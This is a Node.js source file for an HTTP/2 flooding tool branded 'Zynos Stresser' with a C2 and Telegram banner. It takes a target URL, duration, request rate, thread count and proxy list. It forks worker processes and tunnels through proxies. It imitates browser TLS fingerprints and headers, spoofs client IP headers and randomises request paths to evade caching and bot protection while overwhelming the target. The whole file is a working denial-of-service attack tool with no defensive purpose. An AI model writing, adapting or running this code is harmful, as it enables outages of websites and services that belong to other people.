const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

const blue = '\x1b[34m';
const white = '\x1b[37m';
const reset = '\x1b[0m';

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

const encoding_header = [
  'gzip, deflate, br',
  'gzip, deflate',
  'gzip, deflate, br, zstd'
];

const cache_header = [
  'no-cache, no-store, private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
];

const refers = [
  "https://google.com",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://discord.com",
  "https://www.cloudflare.com",
  "https://www.twitter.com/",
  "https://www.instagram.com/"
];

const uap = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/117.0.0.0"
];

const language_header = [
  "id-ID,id;q=0.9,en;q=0.8",
  "en-US,en;q=0.9,id;q=0.8",
  "en-GB,en;q=0.9",
  "ja-JP,ja;q=0.9,en;q=0.8",
  "zh-CN,zh;q=0.9,en;q=0.8"
];

const fetch_site = [
  "same-origin", 
  "same-site", 
  "cross-site", 
  "none"
];

const fetch_mode = [
  "navigate", 
  "same-origin", 
  "no-cors", 
  "cors"
];

const fetch_dest = [
  "document", 
  "sharedworker", 
  "subresource", 
  "unknown", 
  "worker"
];

const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
  "ecdsa_secp256r1_sha256",
  "rsa_pss_rsae_sha256",
  "rsa_pkcs1_sha256",
  "ecdsa_secp384r1_sha384",
  "rsa_pss_rsae_sha384",
  "rsa_pkcs1_sha384",
  "rsa_pss_rsae_sha512",
  "rsa_pkcs1_sha512"
];

const sec_ch_ua = [
  '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"',
  '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
  '"Microsoft Edge";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Google Chrome";v="130", "Chromium";v="130", "Not_A Brand";v="24"',
  '"Google Chrome";v="129", "Chromium";v="129", "Not_A Brand";v="24"',
  '"Opera";v="118", "Chromium";v="133", "Not_A Brand";v="24"'    
];

const sec_ch_ua_platform = [
  '"Windows"',
  '"macOS"',
  '"Linux"',
  '"Android"',
  '"iOS"'
];

const sec_ch_ua_mobile = [
  '?0',
  '?1',
  '?0'
];

let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt`);
    process.exit();
}

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mUser: \x1b[32mPrv\x1b[0m \x1b[36m|\x1b[0m \x1b[33mVip: \x1b[32mtrue\x1b[0m \x1b[36m|\x1b[0m \x1b[33mSuperVip: \x1b[32mtrue\x1b[0m`);
    console.log(`\x1b[33mAdmin: \x1b[35mZYNOS\x1b[0m \x1b[36m|\x1b[0m \x1b[33mExpired: \x1b[31mNo\x1b[0m \x1b[36m|\x1b[0m \x1b[33mTime Limit: \x1b[32m${args.time}s\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mTarget: \x1b[37m${args.target}\x1b[0m`);
    console.log(`\x1b[33mRate: \x1b[37m${args.Rate}/s\x1b[0m \x1b[36m|\x1b[0m \x1b[33mThreads: \x1b[37m${args.threads}\x1b[0m`);
    console.log(`\x1b[33mProxy: \x1b[37m${args.proxyFile} (\x1b[32m${proxies.length}\x1b[37m)\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[35mZynos Stresser 2025-2026 | C2 | t.me/zynos_official\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nUser-Agent: Mozilla/5.0\r\nConnection: Keep-Alive\r\n\r\n`;
        const connection = net.connect({
            host: options.host,
            port: options.port,
            timeout: 15000
        });

        let dataBuffer = '';
        let isConnected = false;

        connection.on("connect", () => {
            connection.write(payload);
        });

        connection.on("data", chunk => {
            dataBuffer += chunk.toString('utf-8');
            if (dataBuffer.includes("HTTP/1.1 200") || dataBuffer.includes("HTTP/1.0 200")) {
                if (!isConnected) {
                    isConnected = true;
                    return callback(connection, undefined);
                }
            }
            if (dataBuffer.includes("HTTP/1.1 403") || dataBuffer.includes("HTTP/1.1 407")) {
                connection.destroy();
                return callback(undefined, "error: proxy auth needed");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout");
        });

        connection.on("error", (err) => {
            connection.destroy();
            return callback(undefined, "error: " + err.message);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() && !line.startsWith('#'));
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}

function generateRandomBody(minSize, maxSize) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}[]":,';
    const size = Math.floor(Math.random() * (maxSize - minSize + 1)) + minSize;
    let result = '';
    for (let i = 0; i < size; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

const spoofHeaders = [
    { "accept-char": "UTF-8" },
    { "Geo-Location": "UNKNOWN" },
    { "Expect-CT": "99-OK" },
    { "CDN-Loop": "cloudflare" },    
    { "CF-Worker": "true" },
    { "X-Forwarded-For": ip_spoof() },
    { "X-Real-IP": ip_spoof() },
    { "X-Client-IP": ip_spoof() },
    { "X-Originating-IP": ip_spoof() },
    { "CF-Connecting-IP": ip_spoof() },
    { "X-Forwarded-Port": "443" },
    { "x-requested-with": "XMLHttpRequest" },
    { "X-HTTP-Method-Override": "GET" },
    { "X-Forwarded-Host": parsedTarget.host }
];

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
        
    let ZynosHeaders = {
      ":authority": parsedTarget.host,
      ":scheme": "https",
      ":path": "/" + randstr(10) + "/" + generateRandomString(15, 25) + "?" + randstr(8) + "=" + generateRandomString(20, 35) + "&" + randstr(6) + "=" + randstrs(15) + "&t=" + Date.now() + randstr(5),
      ":method": "GET",
      "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
      "accept-encoding": "gzip, deflate, br",
      "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
      "cache-control": "no-cache, no-store, private, max-age=0, must-revalidate",
      "referer": refers[Math.floor(Math.random() * refers.length)],
      "user-agent": uap[Math.floor(Math.random() * uap.length)],
      "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
      "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
      "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
      "sec-ch-ua": sec_ch_ua[Math.floor(Math.random() * sec_ch_ua.length)],
      "sec-ch-ua-mobile": sec_ch_ua_mobile[Math.floor(Math.random() * sec_ch_ua_mobile.length)],
      "sec-ch-ua-platform": sec_ch_ua_platform[Math.floor(Math.random() * sec_ch_ua_platform.length)],
      "upgrade-insecure-requests": "1",
      "pragma": "no-cache",
      "te": "trailers",
      "x-forwarded-for": ip_spoof(),
      "x-real-ip": ip_spoof(),
      "cf-connecting-ip": ip_spoof()
    };
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1] || 443,
        address: parsedTarget.host,
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            socket: connection,
            ALPNProtocols: ["h2", "http/1.1"],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ciphers: cplist.join(':'),
            secureContext: tls.createSecureContext({
                ciphers: ciphers,
                sigalgs: SignalsList,
                honorCipherOrder: true,
                secureOptions: secureOptions,
                secureProtocol: secureProtocol
            }),
            sessionTimeout: 300000,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            requestCert: false,
            rejectUnauthorized: false
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
                tlsSocket.destroy();
                connection.destroy();
                return;
            }

            tlsSocket.setKeepAlive(true, 600000);
            tlsSocket.setNoDelay(true);

            const client = http2.connect(`https://${parsedTarget.host}`, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    maxHeaderListSize: 65536,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    enablePush: false
                },
                timeout: 60000,
                maxSessionMemory: 1000,
                peerMaxConcurrentStreams: 100,
                selectPadding: false
            });

            // INTERVAL LANGSUNG JALAN
            const interval = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const randomPath = "/" + randstr(8) + "/" + generateRandomString(12, 20) + "?" + randstr(6) + "=" + generateRandomString(15, 30) + "&" + randstr(4) + "=" + randstrs(12) + "&_=" + Date.now() + randstr(4);
                    
                    const dynHeaders = {
                        ...ZynosHeaders,
                        ":path": randomPath,
                        "x-forwarded-for": ip_spoof(),
                        "x-real-ip": ip_spoof(),
                        "cf-connecting-ip": ip_spoof(),
                        "x-requested-with": "XMLHttpRequest",
                        "cache-control": "no-cache, no-store, private, max-age=0, must-revalidate",
                        "referer": refers[Math.floor(Math.random() * refers.length)] + "/" + randstr(6)
                    };

                    try {
                        const req = client.request(dynHeaders, {
                            parent: 0,
                            exclusive: true,
                            weight: Math.floor(Math.random() * 256) + 1,
                            endStream: false
                        });

                        // KIRIM BODY RANDOM BIAR DIANGGAP REAL
                        if (Math.random() > 0.5) {
                            const body = generateRandomBody(50, 200);
                            req.write(body);
                        }

                        req.on('response', (headers, flags) => {
                            req.close();
                            req.destroy();
                        });

                        req.on('error', () => {
                            req.destroy();
                        });

                        req.end();
                    } catch (err) { }
                }
            }, 1000);

            client.on('close', () => {
                clearInterval(interval);
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
            });

            client.on("error", () => {
                clearInterval(interval);
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
            });
        });

        tlsSocket.on("error", () => {
            tlsSocket.destroy();
            connection.destroy();
        });

        tlsSocket.on("close", () => {
            connection.destroy();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });